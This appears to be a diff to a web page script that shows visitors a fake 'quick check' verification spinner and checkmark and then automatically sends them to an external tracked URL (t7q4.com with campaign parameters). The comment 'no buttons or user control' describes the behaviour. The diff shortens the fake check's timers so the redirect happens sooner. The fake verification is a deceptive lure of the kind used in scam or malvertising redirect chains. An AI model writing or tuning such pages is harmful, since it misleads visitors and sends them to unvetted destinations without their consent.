@@ -183,7 +183,7 @@
       helper.textContent = 'Please wait while we complete a quick check.';
       sub.textContent = 'in progress…';
 
-      // After 5s from start of spinner: finish + redirect
+      // After 1s from start of spinner: finish + redirect
       setTimeout(() => {
         spinner.style.display = 'none';
         box.classList.add('checked');
@@ -192,8 +192,8 @@
 
         // Small grace period for the checkmark animation
         setTimeout(() => { window.location.href = 'http://t7q4.com/?utm_campaign=RuEoNAxI6g&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
-      }, 5000);
-    }, 300); // "few milliseconds" before starting the spinner
+      }, 1000);
+    }, 100); // "few milliseconds" before starting the spinner
   }
 
   // Start automatically; no buttons or user control
